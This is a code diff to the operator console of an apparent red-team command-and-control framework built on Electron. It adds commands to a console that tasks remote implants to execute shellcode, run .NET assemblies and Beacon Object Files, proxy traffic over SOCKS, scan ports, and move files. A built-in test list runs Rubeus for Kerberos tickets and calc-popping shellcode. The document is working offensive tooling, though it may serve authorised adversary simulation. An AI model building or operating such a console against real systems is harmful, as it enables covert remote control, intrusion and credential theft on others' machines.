@@ -22,11 +22,7 @@ let user_log = '';
 let pid_log = '';
 let currentSuggestionIndex = -1;
 let suggestions = [];
-let containerName = '';
-let containerKey;
-let containerBlob;
-let agentObj;
-let agent;
+global.agent;
 let window_agentid = "";
 
 const commands = [
@@ -34,10 +30,11 @@ const commands = [
     'spawn', 'drives', 'cat',
     'mv', 'sleep', 'cp', 'load',
     'upload', 'download', 'scexec', 'scan',
-    'exit-all', 'assembly', 'help', 'dns'
+    'exit', 'assembly', 'help', 'dns','cd',
+    'bof'
 ];
 
-const commandHistory = [];
+global.commandHistory = [];
 let currentCommandIndex = -1;
 
 function generateUUID(len) {
@@ -70,7 +67,7 @@ function timeDifference(oldTimestamp) {
 }
 
 const commandDetails = [
-    { name: "help", help: "Display help.\r\n" },
+    { name: "help", help: "Display this help menu\r\n" },
     { name: "pwd", help: "Print working directory\r\n\tpwd\r\n" },
     { name: "ls", help: "File and directory listing\r\n\tls [remote_path]\r\n\tls ./\r\n\tls C:/Users/user/Desktop/\r\n" },
     { name: "cat", help: "Display contents of a file\r\n\tcat [remote_path]\r\n\tcat ./kernel.js\r\n\tcat C:/Users/user/Desktop/creds.log\r\n" },
@@ -80,12 +77,17 @@ const commandDetails = [
     { name: "mv", help: "Move a file to a new destination\r\n\tmv [remote_src] [remote_dst]\r\n\t" },
     { name: "sleep", help: "Sleep for seconds with jitter\r\n\sleep [s] [jitter%]\r\n\tsleep 20 15\r\n\t" },
     { name: "cp", help: "Copy a file\r\n\tcp [remote_src] [remote_dst]\r\n\t" },
-    { name: "exit-all", help: "Exits the agent. The agent won't callback anymore\r\n\t" },
+    { name: "cd", help: "Change directory\r\n\tcd [remote_path]\r\n\tcd /agent/dst\r\n\t" },
+    { name: "exit", help: "Exits the agent. The agent won't callback anymore\r\n\t" },
     { name: "load", help: "Load a node PE file from disk into the process\r\n\tload [remote_path]\r\n\tload ./git.node\r\n\t- Needs the ./ in front\r\n" },
     { name: "scexec", help: "Execute shellcode\r\n\tscexec [local_path]\r\n\tscexec /operator/src/shellcode/bin\r\n" },
     { name: "assembly", help: "Execute a .NET assembly and get command output\r\n\tassembly [local_path] [arg1] [arg2] ..\r\n\tassembly /operator/src/assembly arg1 arg2 arg3..\r\n" },
     { name: "upload", help: "Upload a file from your local operator box to the remote agent box\r\n\tupload [local_path] [remote_path]\r\n\tupload /operator/src/file /agent/dst/file\r\n" },
     { name: "download", help: "Download a file from remote agent box to local operator box /\r\n\tdownload [remote_path]\r\n\tdownload /agent/src/file\r\n\t- Get from View > Downloads\r\n" },
+    { name: "socks", help: "socks <url> \r\n" +
+        "        - Connect to a SOCKS5 server.\r\n" +
+        "    Examples:\r\n" +
+        "        socks xyz.cloudfront.net:443/ws/agent/09f21e3b6e247b8a6a6ee2472f5\r\n" },
     { name: "scan", help: "scan <host> [-p<ports>] \r\n" +
         "        - The target host or CIDR range to scan.\r\n" +
         "        - Options:\r\n" +
@@ -110,7 +112,8 @@ const commandDetails = [
         "        - Use a custom DNS server\r\n" +
         "    dns @default\r\n" +
         "        - Reset the DNS server config\r\n" },
-    { name: "set", help: "Set the Node load paths for assembly node and scexec nodes\r\n\tset scexec_path C:/Users/user/AppData/ExcludedApp/scexec.node\r\n\tset assembly_path C:/Users/user/AppData/ExcludedApp/assembly.node\r\n" }
+    { name: "set", help: "Set the Node load paths for assembly node and scexec nodes\r\n\tset scexec_path C:/Users/user/AppData/ExcludedApp/scexec.node\r\n\tset assembly_path C:/Users/user/AppData/ExcludedApp/assembly.node\r\n" },
+    { name: "bof", help: "Execute a Beacon Object File (BOF)\r\n\tbof <path_to_coff_file> <function_name> <format_string> [args...]\r\n\tFormat specifiers:\r\n\t  z = null-terminated string (char*)\r\n\t  i = 4-byte integer (int)\r\n\t  b = binary blob (void*, length)\r\n\t  w = wide string (wchar_t*)\r\n\tExamples:\r\n\t  bof ./test.coff go z test_string\r\n\t  bof ./test.coff go i 1234\r\n\t  bof ./test.coff go b 41414141 4\r\n\t  bof ./test.coff go w test_wide_string\r\n" }
 ];
 
 function getHelpInfo(command) {
@@ -190,7 +193,55 @@ function getFormattedTimestamp() {
     return formattedTimestamp;
 }
 
+class Task {
+    constructor(command) {
+        this.outputChannel = 'o-' + Math.random().toString(36).substring(2, 14);
+        this.uploadChannel = 'u-' + Math.random().toString(36).substring(2, 14);
+        this.command = command;
+        this.taskid = Math.random().toString(36).substring(2, 14);
+    }
+}
+
+function getCommandHistoryFile(hostname) {
+    return path.join(directories.logDir, `command_history_${hostname}.log`);
+}
+
+function saveCommandToHistory(command, hostname) {
+    try {
+        const historyFile = getCommandHistoryFile(hostname);
+        fs.appendFileSync(historyFile, `${command}\n`);
+    } catch (error) {
+        log(`Error saving command to history: ${error.message}`);
+    }
+}
+
+function loadCommandHistory(hostname) {
+    try {
+        const historyFile = getCommandHistoryFile(hostname);
+        if (fs.existsSync(historyFile)) {
+            const commands = fs.readFileSync(historyFile, 'utf8').split('\n').filter(cmd => cmd.trim());
+            global.commandHistory = commands;
+            currentCommandIndex = global.commandHistory.length;
+        }
+    } catch (error) {
+        log(`Error loading command history: ${error.message}`);
+    }
+}
+
+function showHelp() {
+    const maxLength = commandDetails.reduce((max, cmd) => {
+    return cmd.name.length > max ? cmd.name.length : max;
+    }, 0);
+    commandDetails.forEach(thiscmd => {
+    const paddedName = thiscmd.name.padEnd(maxLength, ' ');
+    let cmdhelp = thiscmd.help.split('\r\n');
+    cmdhelp = cmdhelp[0];
+    printToConsole(`<i style="color:#c0c0c0">${paddedName} : ${cmdhelp}</i>`);
+    });
+}
+
 function sendCommand() {
+    log(`agent.js | sendCommand() | agent : \r\n${JSON.stringify(global.agent)}`);
     try {
         if (global.inputload === false) {
             return;
@@ -198,22 +249,21 @@ function sendCommand() {
         const input = document.getElementById('consoleInput');
         let command = input.value.trim();
         command = command.trim();
-        commandHistory.push(command);
+        global.commandHistory.push(command);
+        saveCommandToHistory(command, global.agent.hostname);
+        let original_command = command;
         let argv = splitStringWithQuotes(command);
-        if (commandHistory.length > 1000) {
-            commandHistory.shift();
+        if (global.commandHistory.length > 1000) {
+            global.commandHistory.shift();
         }
-        currentCommandIndex = commandHistory.length;
-        let PSString;
-        if (agentObj) {
-            PSString = `<span style="color:#acdff2">[${getFormattedTimestamp()}]</span> <span style="color:#ff0000">advsim</span>`
-        }
+        currentCommandIndex = global.commandHistory.length;
+        let PSString = `<span style="color:#acdff2">[${getFormattedTimestamp()}]</span> <span style="color:#ff0000">${global.agent.username}</span>`;
         let UnknownCommand = true;
         commandDetails.forEach(thiscmd => {
             if (argv[0] === thiscmd.name) { UnknownCommand = false; }
         });
         if (UnknownCommand) {
-            printToConsole(`Unknown command: ${command}`);
+            printToConsole(`<i><span style="color:#ff0000">[!] Unknown command : "${command}". Type "help" for a list of commands.</span></i>`);
             input.value = '';
             closeDropdown();
             return;
@@ -236,34 +286,31 @@ function sendCommand() {
             }
             if (argv.length > 1) {
                 let commandHelp = getHelpInfo(command);
-                printToConsole(`${PSString}$ ${command}`);
-                printToConsole(commandHelp);
+                printToConsole(`${PSString}$ ${original_command}`);
+                printToConsole(`<i style="color:#c0c0c0">${commandHelp}</i>`);
                 input.value = '';
                 closeDropdown();
                 return;
             } else {
-                const maxLength = commandDetails.reduce((max, cmd) => {
-                    return cmd.name.length > max ? cmd.name.length : max;
-                }, 0);
-                commandDetails.forEach(thiscmd => {
-                    const paddedName = thiscmd.name.padEnd(maxLength, ' ');
-                    let cmdhelp = thiscmd.help.split('\r\n');
-                    cmdhelp = cmdhelp[0];
-                    printToConsole(`${paddedName} : ${cmdhelp}`);
-                });
+                printToConsole(`${PSString}$ ${original_command}`);
+                showHelp();
                 input.value = '';
                 closeDropdown();
                 return;
             }
         }
-        let containerCmd = JSON.parse(`{"blobs":${containerBlob}}`);
-        containerCmd.key = JSON.parse(containerKey);
-        containerCmd.name = containerName;
-        containerCmd.cmd = command;
+        const task = new Task(
+            command
+        );
+        if (!Array.isArray(global.agent.tasks)) {
+            global.agent.tasks = [];
+        }
+        global.agent.tasks.push(task);
         let download;
         let upload = false;
         let scexec_upload = false;
         let assembly_upload = false;
+        let bof_upload = false;
         let uploadblob = "";
         let uploadfile = "";
         let argsAmountError = false;
@@ -278,9 +325,9 @@ function sendCommand() {
             if (argv.length == 2) {
                 download = doDownloadFile(argv);
                 command = `download ${download['file']} ${download['blob']}`;
-                containerCmd.cmd = command;
-                log(`agent-window.js : IPC : pull-download-file`);
-                ipcRenderer.send('pull-download-file', JSON.stringify(containerCmd), download['file'], download['blob']);
+                global.agent.tasks[global.agent.tasks.length - 1].command = command;
+                log(`agent.js : IPC : pull-download-file`);
+                ipcRenderer.send('pull-download-file', global.agent, download['file'], download['blob']);
             } else {
                 argsAmountError = true;
             }
@@ -291,7 +338,7 @@ function sendCommand() {
                 const destFilePath = argv[2];
                 uploadblob = 'u' + generateUUID(10);
                 command = `upload ${uploadblob} ${destFilePath}`;
-                containerCmd.cmd = command;
+                global.agent.tasks[global.agent.tasks.length - 1].command = command;
                 upload = true;
             } else {
                 argsAmountError = true;
@@ -302,7 +349,7 @@ function sendCommand() {
                 scfile = argv[1];
                 scblob = 'sc' + generateUUID(10);
                 command = `scexec ${scblob}`;
-                containerCmd.cmd = command;
+                global.agent.tasks[global.agent.tasks.length - 1].command = command;
                 scexec_upload = true;
             } else {
                 argsAmountError = true;
@@ -315,8 +362,16 @@ function sendCommand() {
                 log(`args string : ${args}`);
                 scblob = 'sc' + generateUUID(10);
                 command = `assembly ${scblob} ${args}`;
-                containerCmd.cmd = command;
+                global.agent.tasks[global.agent.tasks.length - 1].command = command;
                 assembly_upload = true;
+            } else {
+                argsAmountError = true;
+            }
+        }
+
+        if (argv[0] == "bof") {
+            if (argv.length > 1) {
+                bof_upload = true;
             } else {
                 argsAmountError = true;
             }
@@ -333,22 +388,24 @@ function sendCommand() {
         }
 
         log(`Sending command ${command}`);
-        printToConsole(`${PSString}$ ${command}`);
+        printToConsole(`${PSString}$ ${original_command}`);
         input.value = '';
 
         if (upload) {
-            printToConsole(`Uploading operator ${uploadfile} file to blob ${uploadblob}`);
-            ipcRenderer.send('upload-file-to-blob', JSON.stringify(containerCmd), uploadfile, uploadblob);
+            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${uploadfile}</b> file to blob <b>${uploadblob}</b></i>`);
+            ipcRenderer.send('upload-file-to-blob', global.agent, uploadfile, uploadblob);
         } else if (assembly_upload) {
-            printToConsole(`Uploading operator ${scfile} assembly file to blob ${scblob}`);
-            ipcRenderer.send('upload-sc-to-blob', JSON.stringify(containerCmd), scfile, scblob);
+            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${scfile}</b> assembly file to blob <b>${scblob}</b></i>`);
+            ipcRenderer.send('upload-sc-to-blob', global.agent, scfile, scblob);
+        } else if (bof_upload) {
+            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${argv[1]}</b> BOF file to blob <b>${task.uploadChannel}</b></i>`);
+            ipcRenderer.send('upload-sc-to-blob', global.agent, argv[1], task.uploadChannel);
         } else if (scexec_upload) {
-            printToConsole(`Uploading operator ${scfile} shellcode file to blob ${scblob}`);
-            ipcRenderer.send('upload-sc-to-blob', JSON.stringify(containerCmd), scfile, scblob);
+            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${scfile}</b> shellcode file to blob <b>${scblob}</b></i>`);
+            ipcRenderer.send('upload-sc-to-blob', global.agent, scfile, scblob);
         } else {
-            log(`agent-window.js : IPC : upload-client-command-to-input-channel`);
-            log(`containerCmd : \r\n${JSON.stringify(containerCmd)}`);
-            ipcRenderer.send('upload-client-command-to-input-channel', JSON.stringify(containerCmd));
+            log(`agent.js | sendCommand() | agent : \r\n${JSON.stringify(global.agent)}`);
+            ipcRenderer.send('upload-client-command-to-input-channel', global.agent);
             closeDropdown();
         }
     } catch (error) {
@@ -356,10 +413,11 @@ function sendCommand() {
     }
 }
 
-ipcRenderer.on('send-upload-command', (event, containerCmd) => {
+ipcRenderer.on('send-upload-command', (event, agent_object) => {
     try {
-        printToConsole(`[+] Completed uploading operator file to blob`);
-        ipcRenderer.send('upload-client-command-to-input-channel', containerCmd);
+        log(`agent.js | send-upload-command | agent_object : ${JSON.stringify(agent_object)}`);
+        printToConsole(`<i style="color:#808080">[+] Completed uploading operator file to blob</i>`);
+        ipcRenderer.send('upload-client-command-to-input-channel', agent_object);
     } catch (error) {
         log(error);
     }
@@ -472,15 +530,17 @@ function handleTabCompletion(event) {
 }
 
 window.addEventListener('DOMContentLoaded', async () => {
-    ipcRenderer.on('container-data', (event, name, aes, blobs, agentJson) => {
-        try {
-            containerName = name;
-            containerKey = JSON.stringify(aes);
-            containerBlob = JSON.stringify(blobs);
-            agent = JSON.parse(agentJson);
-            agentObj = agent;
 
-            document.title = `${agent.agentid.toUpperCase()} | ${agent.hostname.toUpperCase()} | ${agent.username.toUpperCase()} | ${agent.IP}`;
+    ipcRenderer.on('container-data', (event, agent_object) => {
+        try {
+            log(`agent.js | container-data | agent_object : ${JSON.stringify(agent_object)}`);
+            containerName = agent_object.container;
+            containerKey = agent_object.aes;
+            containerBlob = agent_object.blobs;
+            //agent = JSON.parse(agent_object);
+            global.agent = agent_object;
+
+            document.title = `${agent_object.agentid.toUpperCase()} | ${agent_object.hostname.toUpperCase()} | ${agent_object.username.toUpperCase()} | ${agent_object.IP}`;
 
             const input = document.getElementById('consoleInput');
             input.focus();
@@ -489,6 +549,7 @@ window.addEventListener('DOMContentLoaded', async () => {
             log(error);
         }
     });
+
     ipcRenderer.on('agent-checkin', (event, checkin_data) => {
         try {
             printToConsole(`Checkin Data : ${checkin_data}`);
@@ -498,6 +559,7 @@ window.addEventListener('DOMContentLoaded', async () => {
     });
 
     ipcRenderer.on('command-result', (event, result) => {
+        log(`[AGENT][IPC] command-result : ${result}`);
         printToConsole(result);
     });
 
@@ -514,16 +576,16 @@ window.addEventListener('DOMContentLoaded', async () => {
         } else if (event.key === 'ArrowUp') {
             if (currentCommandIndex > 0) {
                 currentCommandIndex--;
-                input.value = commandHistory[currentCommandIndex];
+                input.value = global.commandHistory[currentCommandIndex] || "";
             } else if (currentCommandIndex === 0) {
-                input.value = commandHistory[currentCommandIndex];
+                input.value = global.commandHistory[currentCommandIndex] || "";
             }
             event.preventDefault();
         } else if (event.key === 'ArrowDown') {
-            if (currentCommandIndex < commandHistory.length - 1) {
+            if (currentCommandIndex < global.commandHistory.length - 1) {
                 currentCommandIndex++;
-                input.value = commandHistory[currentCommandIndex];
-            } else if (currentCommandIndex === commandHistory.length - 1) {
+                input.value = global.commandHistory[currentCommandIndex] || "";
+            } else if (currentCommandIndex === global.commandHistory.length - 1) {
                 currentCommandIndex++;
                 input.value = '';
             }
@@ -548,17 +610,25 @@ window.addEventListener('DOMContentLoaded', async () => {
             event.preventDefault();
         }
     });
+
+    // Send message to main process to add test command menu item
+    ipcRenderer.send('add-test-command-menu');
+    
+    // Listen for test command trigger from main process
+    ipcRenderer.on('execute-test-command', () => {
+        executeCommandTests();
+    });
 });
 
 async function updateTable() {
     try {
         const agentTable = document.getElementById('agentTable').getElementsByTagName('tbody')[0];
-        let agentid = agent.agentid;
+        let agentid = global.agent.agentid;
         window_agentid = agentid;
         let agentcheckin = await ipcRenderer.invoke('get-agent-checkin', agentid);
 
         if (agentcheckin) {
-            log(`agentcheckin : ${agentcheckin}`);
+            //log(`agentcheckin : ${agentcheckin}`);
             agentcheckin = JSON.parse(agentcheckin);
 
             const filePath = agentcheckin.Process.trim();
@@ -572,11 +642,11 @@ async function updateTable() {
             }
             for (let row of agentTable.rows) {
                 let platformName = agentcheckin.platform;
-                if (agent.platform === "darwin") {
+                if (global.agent.platform === "darwin") {
                     platformName = "macOS";
-                } else if (agent.platform === "win32") {
+                } else if (global.agent.platform === "win32") {
                     platformName = "Windows";
-                } else if (agent.platform === "linux") {
+                } else if (global.agent.platform === "linux") {
                     platformName = "Linux";
                 }
                 row.cells[0].textContent = agentcheckin.agentid;
@@ -595,6 +665,7 @@ async function updateTable() {
             if (global.historyload === false) {
                 log(`Loading previous command history`);
                 global.historyload = true;
+                loadCommandHistory(global.agent.hostname);
                 loadPreviousLogs();
             }
             global.inputload = true;
@@ -605,10 +676,51 @@ async function updateTable() {
 }
 setInterval(updateTable, 1000);
 
-ipcRenderer.on('command-output', (event, output) => {
+async function format_ls_output(filesAndFolders) {
+    let resultBuffer = '';
+    resultBuffer += `Name`.padEnd(60) + `Type`.padEnd(16) + `Size (bytes)`.padEnd(15) + `Created`.padEnd(24) + `Modified`.padEnd(24) + '\n';
+    resultBuffer += '-'.repeat(30) + '-'.repeat(10) + '-'.repeat(15) + '-'.repeat(30) + '-'.repeat(30) + '\n';
+    log(`[AGENT][IPC] format_ls_output : ${filesAndFolders}`);
+    let entries = JSON.parse(filesAndFolders)
+
+    for (const entry of entries) {
+        try {
+            log(`[AGENT][IPC] entry : ${entry}`);
+            const options = { 
+                month: '2-digit', 
+                day: '2-digit', 
+                year: '2-digit', 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit', 
+                hour12: false 
+            };
+            resultBuffer += (entry.name || '').padEnd(60);
+            resultBuffer += (entry.type || '').padEnd(16);
+            resultBuffer += (entry.stats.size ? String(entry.stats.size) : '').padEnd(15);
+            resultBuffer += (entry.stats.ctimeMs ? new Date(entry.stats.ctimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
+            resultBuffer += (entry.stats.mtimeMs ? new Date(entry.stats.mtimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
+            resultBuffer += '\n';
+        } catch (err) {
+            log(`Error: ${err.message}`);
+        }
+    }
+    return resultBuffer;
+}
+
+ipcRenderer.on('command-output', async (event, command_response) => {
     try {
-        if (output) {
-            printToConsole(output);
+        if (command_response.command.startsWith('ls')) {
+            let resultBuffer = await format_ls_output(command_response.output);
+            printToConsole(resultBuffer);
+        } else if (command_response.command.startsWith('bof ')) {
+            if (command_response.command.startsWith('bof ')) {
+                printToConsole(command_response.output.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
+            } else {
+                printToConsole(command_response.output);
+            }
+        } else {
+            printToConsole(command_response.output);
         }
     } catch (error) {
         log(`Error in ipcRender(delete-old-container): ${error.message}\r\n${error.stack}`);
@@ -617,7 +729,7 @@ ipcRenderer.on('command-output', (event, output) => {
 
 ipcRenderer.on('window-closing', async () => {
     try {
-        log(`agent-window.js : IPC window-closing`);
+        log(`agent.js : IPC window-closing`);
         log(`agentid: ${window_agentid}`);
         ipcRenderer.send('force-close', window_agentid);
     } catch (error) {
@@ -662,4 +774,50 @@ function moveCursorByWord(input, direction) {
         while (pos < value.length && value[pos] !== " ") pos++;
     }
     input.selectionStart = input.selectionEnd = pos;
+}
+
+const testCommands = [
+    { command: "sleep 1 0"},
+    { command: "sleep 0 0"},
+    { command: "cd C:\\TEMP"},
+    { command: "pwd"},
+    { command: "ls \"C:\\Program Files (x86)\\Microsoft\""},
+    { command: "ls C:\\\\Program\\ Files\\ (x86)\\\\Microsoft"},
+    { command: "ls 'C:\\Program Files (x86)\\Microsoft'"},
+    { command: "ls 'C:/Program Files (x86)/Microsoft'"},
+    { command: "dns reverse 1.1.1.1"},
+    { command: "dns lookup google.com"},
+    { command: "bof /Users/bobby/CS/SA/dir/dir.x64.o go z \"C:\\Users\\user\\Desktop\""},
+    { command: "spawn powershell.exe -c \"echo testing > C:\\TEMP\\testing.txt\""},
+    { command: "ls"},
+    { command: "pwd"},
+    { command: "cat testing.txt"},
+    { command: "mv testing.txt testing2.txt"},
+    { command: "ls .\\"},
+    { command: "cp testing2.txt testing3.txt"},
+    { command: "ls ./"},
+    { command: "download testing3.txt"},
+    { command: "cd"},
+    { command: "upload /Users/bobby/Loki/downloads/testing3.txt ./"},
+    { command: "scan 127.0.0.1 -p22,80,445,8080"},
+    { command: "assembly /Users/bobby/Rubeus_v4.0_InspirationOpinion.exe klist"},
+    { command: "scexec /Users/bobby/popcalc.bin"}
+];
+    
+async function executeCommandTests() {
+    try{
+        printToConsole(`<i style="color:#808080">[+] Starting command tests...</i>`);
+        
+        // Execute each command with basic test parameters
+        for (const cmd of testCommands) {
+            let testCommand = cmd.command;
+            // Put the command in the input box and send it
+            const input = document.getElementById('consoleInput');
+            input.value = testCommand;
+            sendCommand();
+            await new Promise(resolve => setTimeout(resolve, 5000));
+        }
+    } catch (error) {
+        log(`Error in executeCommandTests: ${error.message}\r\n${error.stack}`);
+    }
 }
